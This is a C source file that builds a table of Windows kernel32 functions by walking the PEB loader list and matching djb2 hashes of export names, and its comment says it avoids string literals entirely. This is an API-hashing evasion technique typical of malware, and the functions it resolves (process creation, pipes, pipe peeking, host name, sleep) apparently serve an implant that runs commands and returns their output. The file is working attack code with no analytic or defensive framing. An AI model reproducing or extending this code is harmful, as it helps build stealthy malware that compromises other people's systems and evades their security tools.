/* kernel32.c - the kernel32 function table (see kernel32.h).
 *
 * One ResolveFromModuleByHash call per member: the module is found by
 * walking the loader's list in the PEB (kernel32 is mapped in every
 * Windows process, so nothing needs loading first), then the export
 * table is scanned for the matching djb2 hash (apihash.h). No string
 * literal is involved anywhere in the chain.
 *
 * The NULL-check conjunction at the end doubles as the "did the whole
 * table resolve" flag: callers treat a FALSE return as fatal for their
 * feature, not for the process.
 */

#include "kernel32.h"
#include "system.h"
#include "wintypes.h"
#include "apihash.h"

BOOL KERNEL32_Ctor(KERNEL32 *kernel)
{
    if (kernel == NULL)
        return FALSE;

    kernel->GetProcAddress = (PVOID (WINAPI *)(PVOID, const CHAR *))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_GETPROCADDRESS);
    kernel->LoadLibraryA = (PVOID (WINAPI *)(const CHAR *))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_LOADLIBRARYA);
    kernel->GetComputerNameA = (BOOL (WINAPI *)(PCHAR, DWORD *))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_GETCOMPUTERNAMEA);
    kernel->SetHandleInformation = (BOOL (WINAPI *)(HANDLE, DWORD, DWORD))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_SETHANDLEINFORMATION);
    kernel->CreateProcessW = (BOOL (WINAPI *)(const PWCHAR, const PWCHAR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, PVOID, const PWCHAR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_CREATEPROCESSW);
    kernel->CloseHandle = (BOOL (WINAPI *)(HANDLE))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_CLOSEHANDLE);
    kernel->TerminateProcess = (BOOL (WINAPI *)(HANDLE, UINT32))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_TERMINATEPROCESS);
    kernel->WriteFile = (BOOL (WINAPI *)(HANDLE, const void *, DWORD, DWORD *, PVOID))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_WRITEFILE);
    kernel->ReadFile = (BOOL (WINAPI *)(HANDLE, void *, DWORD, DWORD *, PVOID))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_READFILE);
    kernel->PeekNamedPipe = (BOOL (WINAPI *)(HANDLE, void *, DWORD, DWORD *, DWORD *, DWORD *))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_PEEKNAMEDPIPE);
    kernel->CreatePipe = (BOOL (WINAPI *)(HANDLE *, HANDLE *, LPSECURITY_ATTRIBUTES, DWORD))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_CREATEPIPE);
    kernel->GetStdHandle = (HANDLE (WINAPI *)(DWORD))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_GETSTDHANDLE);
    kernel->GetLastError = (DWORD (WINAPI *)(void))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_GETLASTERROR);
    kernel->Sleep = (void (WINAPI *)(DWORD))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_SLEEP);
    kernel->ExitProcess = (void (WINAPI *)(UINT32))
        ResolveFromModuleByHash(HASH_MOD_KERNEL32, HASH_EXITPROCESS);

    return (kernel->GetProcAddress != NULL &&
            kernel->LoadLibraryA != NULL &&
            kernel->GetComputerNameA != NULL &&
            kernel->SetHandleInformation != NULL &&
            kernel->CreateProcessW != NULL &&
            kernel->CloseHandle != NULL &&
            kernel->TerminateProcess != NULL &&
            kernel->WriteFile != NULL &&
            kernel->ReadFile != NULL &&
            kernel->PeekNamedPipe != NULL &&
            kernel->CreatePipe != NULL &&
            kernel->GetStdHandle != NULL &&
            kernel->GetLastError != NULL &&
            kernel->Sleep != NULL &&
            kernel->ExitProcess != NULL);
}
